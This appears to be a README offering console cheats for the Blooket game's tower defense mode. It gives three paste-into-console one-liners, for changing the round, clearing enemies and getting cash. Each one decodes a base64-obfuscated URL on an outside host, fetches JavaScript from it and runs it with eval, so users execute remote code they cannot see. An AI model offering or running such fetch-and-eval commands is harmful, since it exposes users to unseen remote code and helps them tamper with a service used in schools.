**Discord server: https://discord.gg/K5xUbuDqmG**

**These bookmarklets are also on: https://schoolcheats.net/blooket**

# tower-defense

This cheat only works in tower defense game mode!

# changeGameRound.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RkQ2hhbmdlR2FtZVJvdW5kLmpz')).then((res) => res.text().then((t) => eval(t)))
```

# clearEnemies.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkQ2xlYXJFbmVtaWVzLmpz')).then((res) => res.text().then((t) => eval(t)))
```

# getCash.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkR2V0Q2FzaC5qcw==')).then((res) => res.text().then((t) => eval(t)))
```
